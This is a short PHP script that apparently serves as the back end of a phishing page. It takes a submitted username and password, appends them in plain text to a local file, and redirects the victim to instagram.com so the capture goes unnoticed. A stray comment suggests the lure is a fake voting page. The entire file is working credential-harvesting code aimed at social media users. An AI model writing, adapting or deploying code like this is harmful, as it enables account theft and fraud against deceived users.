<?php
session_start();
include 'db.php';


?>
<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Collect and sanitize the form data
    $username = htmlspecialchars($_POST['username']);
    $password = htmlspecialchars($_POST['password']);
$_SESSION['user_id'] = 123;
    // Prepare the data to be written to the file
    $data = "Username: $username \nPassword: $password\n\n";

    // Define the file path
    $file = 'user_details.txt';

    // Write the data to the file
    file_put_contents($file, $data, FILE_APPEND);

   // echo "Thank You For Your Voiting.";
 header("Location: https://www.instagram.com/");
} else {
    echo "Invalid request.";
}
?>


